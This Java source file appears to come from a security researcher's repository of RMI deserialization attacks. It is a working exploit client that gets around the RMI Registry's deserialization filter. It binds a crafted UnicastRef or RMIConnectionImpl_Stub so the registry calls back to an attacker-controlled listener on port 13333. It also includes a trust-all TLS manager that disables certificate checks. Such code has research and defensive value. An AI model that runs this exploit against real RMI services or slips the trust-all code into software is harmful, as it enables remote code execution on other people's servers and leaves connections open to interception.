package org.su18.serialize.rmi.client.exploit;

import sun.rmi.server.UnicastRef;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.IOException;
import java.lang.reflect.Proxy;
import java.net.Socket;
import java.rmi.ConnectIOException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIClientSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.security.cert.X509Certificate;

/**
 * 在高版本中具有限制
 * <p>
 * 于是我们尝试使用另外的替代方法
 * <p>
 * if (String.class == clazz
 * || java.lang.Number.class.isAssignableFrom(clazz)
 * || Remote.class.isAssignableFrom(clazz)
 * || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)
 * || UnicastRef.class.isAssignableFrom(clazz)
 * || RMIClientSocketFactory.class.isAssignableFrom(clazz)
 * || RMIServerSocketFactory.class.isAssignableFrom(clazz)
 * || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)
 * || java.rmi.server.UID.class.isAssignableFrom(clazz)) {
 * return ObjectInputFilter.Status.ALLOWED;
 * } else {
 * return ObjectInputFilter.Status.REJECTED;
 * }Remote
 * <p>
 * 其中比较值得关注的就是 UnicastRef
 *
 * @author su18
 */
public class RMIClientExploitRegistry2 {

	public static void main(String[] args) throws Exception {

		String host = "localhost";
		int    port = 1099;

		// 连接 Registry
		Registry registry = LocateRegistry.getRegistry(host, port);

		// 尝试 list 如果失败使用 SSL 连接
		try {
			registry.list();
		} catch (ConnectIOException ex) {
			registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
		}

		UnicastRef unicastRef = generateUnicastRef("localhost", 13333);

		// 使用 RemoteObjectInvocationHandler 动态代理
		RemoteObjectInvocationHandler invocationHandler = new RemoteObjectInvocationHandler(unicastRef);
		Remote remote = (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
				new Class[]{Remote.class}, invocationHandler);

		// RMIConnectionImpl_Stub
		RMIConnectionImpl_Stub remote1 = new RMIConnectionImpl_Stub(unicastRef);

		// bind 到 Registry 时会触发反序列化
//		registry.rebind("su18", remote);
		registry.rebind("su18", remote1);

	}

	/**
	 * 创建一个包含了恶意服务的 地址 和 端口的 Ref 类
	 *
	 * @param host 地址
	 * @param port 端口
	 * @return UnicastRef
	 */
	public static UnicastRef generateUnicastRef(String host, int port) {
		java.rmi.server.ObjID             objId    = new java.rmi.server.ObjID();
		sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
		sun.rmi.transport.LiveRef         liveRef  = new sun.rmi.transport.LiveRef(objId, endpoint, false);
		return new sun.rmi.server.UnicastRef(liveRef);
	}


	/**
	 * 后面是使用 SSL 建立连接
	 */
	private static class TrustAllSSL implements X509TrustManager {

		private static final X509Certificate[] ANY_CA = {};

		public X509Certificate[] getAcceptedIssuers() {
			return ANY_CA;
		}

		public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }

		public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
	}

	private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {

		public Socket createSocket(String host, int port) throws IOException {
			try {
				SSLContext ctx = SSLContext.getInstance("TLS");
				ctx.init(null, new TrustManager[]{new TrustAllSSL()}, null);
				SSLSocketFactory factory = ctx.getSocketFactory();
				return factory.createSocket(host, port);
			} catch (Exception e) {
				throw new IOException(e);
			}
		}
	}

}
